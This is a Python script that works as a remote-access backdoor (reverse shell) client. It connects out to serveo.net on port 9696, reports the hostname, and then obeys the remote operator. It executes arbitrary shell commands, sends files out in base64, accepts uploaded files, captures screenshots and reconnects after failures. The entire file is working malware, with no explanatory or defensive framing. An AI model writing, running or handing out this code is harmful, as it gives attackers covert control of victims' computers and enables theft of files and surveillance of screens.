import io
import socket
import subprocess
import os
import base64
from PIL import ImageGrab
import simplejson as json
import time


def read_file(path):
    try:
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())
    except FileNotFoundError:
        return f"File {path} not found"
    except Exception as e:
        return f"Error reading file: {str(e)}"


def save_file(path, data):
    try:
        with open(path, 'wb') as file:
            file.write(base64.b64decode(data))
            return f"Download successful: {path}"
    except Exception as e:
        return f"Error saving file: {str(e)}"


def cd_command(directory):
    try:
        os.chdir(directory)
        return f"Changed directory to {directory}"
    except FileNotFoundError:
        return f"Directory {directory} not found"


def command_execution(commands):
    try:
        return subprocess.check_output(commands, shell=True, stderr=subprocess.STDOUT, encoding='utf-8',
                                       errors='replace')
    except subprocess.CalledProcessError as e:
        return e.output.decode('utf-8', errors='replace')


def get_hostname():
    return socket.gethostname()


def screenshot_file():
    screenshot = ImageGrab.grab()
    img_stream = io.BytesIO()
    screenshot.save(img_stream, format="PNG")
    img_base64 = base64.b64encode(img_stream.getvalue()).decode()
    return img_base64


class MySocket:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        self.my_connection.connect((self.ip, self.port))
        self.json_send(get_hostname())

    def json_send(self, data):
        json_data = json.dumps(data)
        try:
            self.my_connection.send(json_data.encode('utf-8'))
        except Exception as e:
            print(e)

    def json_recv(self):
        json_data = b""
        while True:
            try:
                json_data += self.my_connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue

    def start_socket(self):
        while True:
            self.connect()
            while True:
                try:
                    command = self.json_recv()
                    if command[0] == 'quit':
                        self.my_connection.close()
                        exit()
                    elif command[0] == 'cd' and len(command) > 1:
                        command_output = cd_command(command[1])
                    elif command[0] == 'download':
                        command_output = read_file(command[1])
                    elif command[0] == 'upload':
                        command_output = save_file(command[1], command[2])
                    elif command[0] == 'screenshot':
                        command_output = screenshot_file()
                    else:
                        command_output = command_execution(command)
                    self.json_send(command_output)

                except WindowsError as e:
                    print(str(e))
                    time.sleep(3)

                except Exception as e:
                    print(f"An error occurred: {str(e)}")
                    self.json_send('The command entered is invalid')


def start():
    try:
        my_socket_object = MySocket('serveo.net', 9696)
        my_socket_object.start_socket()
    except Exception as ex:
        print(ex)
        start()


start()
